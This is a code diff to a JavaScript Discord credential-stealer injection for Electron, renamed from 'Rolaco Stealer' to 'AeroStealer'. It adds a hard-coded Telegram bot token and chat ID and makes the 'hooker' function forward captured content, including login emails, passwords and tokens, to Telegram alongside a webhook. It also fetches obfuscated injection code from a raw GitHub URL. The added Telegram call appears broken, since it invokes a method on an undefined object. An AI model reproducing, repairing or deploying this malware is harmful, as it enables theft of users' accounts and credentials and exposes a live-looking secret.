@@ -3,6 +3,7 @@ const fs = require('fs');
 const path = require('path');
 const https = require('https');
 const querystring = require('querystring');
+const TelegramBot = require('node-telegram-bot-api');
 const { BrowserWindow, session } = require('electron');
 const encodedHook = '%WEBHOOKHEREBASE64ENCODED%'
 
@@ -11,11 +12,12 @@ const config = {
   webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
-  ping_val: '@everyone', 
-  embed_name: 'Rolaco Stealer Injection', 
+  ping_val: '@everyone',
+  bot_token: '6590998965:AAHaG94BNvsovzHJtTCtrnr0F-ZVEtIuJkU',
+  embed_name: 'AeroStealer Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Rolaco0/Rolacoim/main/mascot.png',
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Rolaco0/Discord-Injection-RG/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/HumanQueen/Discord-Injection-AS/main/injection-obfuscated.js',
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -653,6 +655,10 @@ const hooker = async (content) => {
   });
   req.write(data);
   req.end();
+
+  const chatId = ["7136845665"];
+  const telegramMessage = 'Nouvelle mise a jour:' + JSON.stringify(content);
+  bot_token.sendMessage(chatId, telegramMessage);
 };
 
 const login = async (email, password, token) => {
